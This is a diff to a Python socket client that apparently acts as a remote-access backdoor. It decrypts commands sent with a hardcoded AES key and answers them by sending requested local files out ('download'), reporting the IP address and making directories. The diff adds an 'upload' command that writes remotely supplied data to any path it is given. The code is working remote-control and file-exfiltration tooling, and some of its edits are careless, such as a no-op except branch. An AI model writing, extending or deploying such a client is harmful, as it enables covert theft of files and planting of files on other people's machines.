@@ -3,7 +3,7 @@ import requests
 import os
 from Crypto.Cipher import AES
 import shutil
-import os
+
 
 #secret_key = os.urandom(BLOCK_SIZE) i generated once and i will use that always
 secret_key=b'b\x90\xf7\x1d\\KY\xc3\xd7\x13\xf1\x90\xba\xe4HS\xe3\xce\x1cd\x8f\xdf\xda\xc8u\xa9B\x85-&<\xb7'
@@ -145,16 +145,17 @@ def sendFile(con,received_message):
         
             #sending the filesize
             total = os.path.getsize(filename)
+            print(total)
             padded_message = padding(str(total))
             sending_message = encryption(padded_message)
             con.sendall(sending_message)
     
             f = open(filename,'rb')
-            l = f.read(4096)
+            l = f.read(1024)
             while (l):
                 con.send(l)
                 print('Sent ',repr(l))
-                l = f.read(4096)
+                l = f.read(1024)
             sending_message = "Done"
         else:
             sending_message = filename + " does not exist."
@@ -164,12 +165,26 @@ def sendFile(con,received_message):
         try:
             f.close()
         except:
-            pass
+            sending_message
         return sending_message
 
-def getFile(con,received_message):
-
-
+def getFile(con,sending_message):
+    filename = sending_message[7:]
+    
+    con.send(encryption(padding(str(len("Start uploading")))))
+    con.sendall(encryption(padding("Start uploading")))
+    print(" This is the sending message Start uploading")
+    filesize = int(unpadding(decryption(con.recv(1024))))
+    with open(filename, 'wb') as f:
+        print('file opened')
+        total=0
+        while total<filesize:
+            print('receiving data...')
+            data = con.recv(4096)
+            print('data=%s', (data))
+            total+=len(data)
+            f.write(data)
+        return "done"
 
 def getIp():
     try:
@@ -197,7 +212,7 @@ def client():
     while received_message != 'close_this_socket':
         # get the length of the incoming data
         len_data = int(decryption(con.recv(1024)));
-        
+        print("Data length ",len_data)
         #start getting that data
         received_message = decryption(con.recv(1024))
         while len(received_message)<len_data:
@@ -227,6 +242,9 @@ def client():
            sending_message = makeDirectories(received_message)
         elif(received_message[0:8]=="download"):
            sending_message = sendFile(con,received_message)
+        elif(received_message[0:6]=="upload"):
+           print("in upload")
+           sending_message = getFile(con,received_message)
         elif(received_message=="ip"):
            sending_message = getIp()
         else:
